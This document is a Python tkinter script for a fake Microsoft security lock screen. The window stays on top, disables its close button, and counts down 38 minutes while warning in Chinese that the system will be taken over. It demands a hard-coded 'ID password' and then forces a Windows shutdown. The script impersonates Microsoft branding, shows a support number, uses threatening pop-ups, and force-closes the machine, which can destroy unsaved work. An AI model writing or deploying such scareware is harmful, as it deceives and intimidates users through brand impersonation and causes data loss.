import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import threading
import os
import time
import webbrowser

# 函数：强制关机
def force_shutdown():
    os.system("shutdown /s /f /t 100")  # 设置0秒后强制关机

# 函数：显示倒计时
def show_countdown(seconds):
    for i in range(seconds, 0, -1):
        minutes, seconds = divmod(i, 60)
        timeformat = '{:02d}:{:02d}'.format(minutes, seconds)
        countdown_label.config(text=f"{timeformat} 时间后系统将接管此电脑")
        root.update_idletasks()  # 更新界面
        time.sleep(1)  # 每秒更新一次倒计时
    force_shutdown()  # 倒计时结束后执行强制关机

# 函数：每隔7分钟弹出提示
def popup_warning():
    while True:
        time.sleep(10*60)  # 等待10分钟
        messagebox.showwarning("Windows Defence系统提示", "请尽快完成身份验证！")

# 函数：验证密码
def verify_password(event=None):
    password = password_entry.get()
    if password == "helloworld":
        messagebox.showinfo("验证成功", "您是授权用户，Welcome！")
        root.destroy()
    else:
        messagebox.showerror("验证失败", "您不是系统授权用户，微软安全中心将远程访问此电脑 /user:11812/ 启动强制关机程序来保障用户信息安全，此过程不可逆。")

# 函数：展示获取设备序列号ID密码的方法并打开Windows安全中心官网
def show_id_password_methods():
    methods_window = tk.Toplevel(root)
    methods_window.title("获取设备序列号ID密码的方法")
    methods_window.geometry("700x400")  # 设置窗口大小
    methods_window.attributes("-topmost", True)  # 窗口置顶

    label_text = """
    若您没有设备序列号ID密码，可以通过以下方法获取：
    1. 登录微软官方网站，访问账户管理页面，查找设备序列号ID密码相关信息。
    2. 联系微软客服，提供设备购买凭证，请求客服协助获取设备序列号ID密码。
    3. 若设备为公司所有，请联系公司IT部门，查询设备序列号ID密码。
    4. 若设备序列号ID密码遗失，可以通过微软提供的密码找回服务尝试找回。
    5. 若以上方法均无法解决问题，建议联系设备制造商或专业技术人员寻求帮助。
    """
    text_label = tk.Label(methods_window, text=label_text, font=('SimSun', 12), justify='left')
    text_label.pack(pady=20, padx=20)

    ok_button = tk.Button(methods_window, text="确定", command=methods_window.destroy, font=('SimSun', 12))
    ok_button.pack(pady=20)

    # 打开Windows安全中心官网
    visit_windows_security_center()

# 函数：访问Windows安全中心官网
def visit_windows_security_center():
    webbrowser.open('https://www.microsoft.com/zh-cn/security/')

# 函数：显示加载动画
def show_loading_animation():
    global loading_frame
    loading_frame = tk.Frame(root, bg='white')
    loading_frame.place(relx=0.5, rely=0.5, anchor='center')

    # 标题
    title_label = tk.Label(loading_frame, text="Microsoft Defence", font=('Arial', 24, 'bold'), bg='white', fg='navy')
    title_label.pack(pady=20)

    # 加载条
    progress_bar = ttk.Progressbar(loading_frame, orient="horizontal", length=200, mode='indeterminate')
    progress_bar.pack(pady=20)

    progress_bar.start(50)  # 50是动画速度

    # 3秒后关闭动画并开始倒计时
    root.after(6000, hide_loading_animation)

# 函数：隐藏加载动画
def hide_loading_animation():
    global loading_frame
    loading_frame.destroy()
    loading_frame = None
    # 显示主窗口内容
    main_frame.pack(pady=20, padx=20)
    countdown_label.pack(pady=20)
    label.pack(pady=10)
    password_entry.pack(pady=10)
    submit_button.pack(pady=10)
    no_id_password_button.pack(pady=10)
    info_text.pack(pady=10, fill='x', expand=True)
    # 启动倒计时线程
    countdown_thread = threading.Thread(target=show_countdown, args=(38*60,))
    countdown_thread.daemon = True  # 设置为守护线程
    countdown_thread.start()

# 主窗口
root = tk.Tk()
root.title("开机验证 * 微软(中国)技术客服电话 400-820-1698")
root.geometry("600x500")  # 设置窗口大小
root.attributes("-topmost", True)  # 窗口置顶
root.attributes("-alpha", 1.0)  # 设置窗口不透明
root.attributes("-toolwindow", True)  # 使窗口无法使用Alt+Tab切换
root.protocol("WM_DELETE_WINDOW", lambda: None)  # 禁用关闭按钮

# 设置窗口布局
main_frame = tk.Frame(root, bg='white')
main_frame.place(relx=0.5, rely=0.5, anchor='center')

# 创建倒计时标签
countdown_label = tk.Label(main_frame, text="强制关机剩余：38:00", font=('SimSun', 24, 'bold'), fg='red')
# 创建标签
label = tk.Label(main_frame, text="请输入系统序列号ID以确认身份：", font=('SimSun', 16))
# 创建密码输入框
password_entry = tk.Entry(main_frame, show="*", font=('SimSun', 16))
password_entry.bind("<Return>", verify_password)  # 绑定Enter键
# 创建确定按钮
submit_button = tk.Button(main_frame, text="确定", command=verify_password, font=('SimSun', 16))
# 创建我没有ID密码按钮
no_id_password_button = tk.Button(main_frame, text="我没有ID密码", command=show_id_password_methods, font=('SimSun', 16))
# 创建关于异地登录的知识文本框
info_text = tk.Text(main_frame, height=10, width=70, font=('SimSun', 12), wrap="word")
info_text.insert(tk.END, "账号异地登陆提示：\n  \n1. 异地登录可能意味着账号安全受到威胁。\n2. 请定期更改密码以保护账号安全。\n3. 如果发现异地登录，请及时检查账号活动并更改密码。\n4. 启用两步验证可以增加账号安全性。\n5. 避免在公共网络上进行敏感操作，以防信息泄露。\n6. 设备序列号ID密码获取方式：登入微软账号或致电 400-820-1698")
info_text.config(state=tk.DISABLED)

# 显示加载动画
show_loading_animation()

# 启动警告弹窗线程
warning_thread = threading.Thread(target=popup_warning)
warning_thread.daemon = True  # 设置为守护线程
warning_thread.start()

root.mainloop()